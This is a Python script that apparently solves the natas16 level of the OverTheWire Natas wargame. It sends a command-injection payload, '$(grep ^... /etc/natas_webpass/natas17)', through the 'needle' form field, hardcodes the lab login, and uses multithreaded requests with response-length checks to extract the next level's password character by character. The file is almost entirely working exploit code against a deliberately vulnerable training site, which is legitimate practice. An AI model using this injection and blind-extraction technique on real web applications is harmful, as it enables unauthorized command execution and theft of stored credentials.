import requests
import string
import threading


def main():
    # Credentials
    url = "http://natas16.natas.labs.overthewire.org/"
    username = "natas16"
    natas16_pwd = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V" # <- Change This!

    characters = string.ascii_letters + string.digits

    # Session
    session = requests.Session()
    session.auth = (username, natas16_pwd)

    natas17_pwd = []
    threads = []

    def test_password(character, password):
        # Payload
        data = {"needle": f"$(grep ^{password + character} /etc/natas_webpass/natas17)"}

        r = session.post(url, data=data)

        # If response is empty that means our grep is correct
        if len(r.text) != 461926:
            natas17_pwd.append(character)

    for _ in range(32):
        password = "".join(natas17_pwd)
        print(password)

        # For every character it creates a thread that make a request to the webpage
        for character in characters:
            t = threading.Thread(target=test_password, args=(character, password))
            threads.append(t)

        for x in threads:
            x.start()

        for x in threads:
            x.join()
        threads = []

    natas17_pwd = "".join(natas17_pwd)
    print(natas17_pwd)


if __name__ == "__main__":
    main()
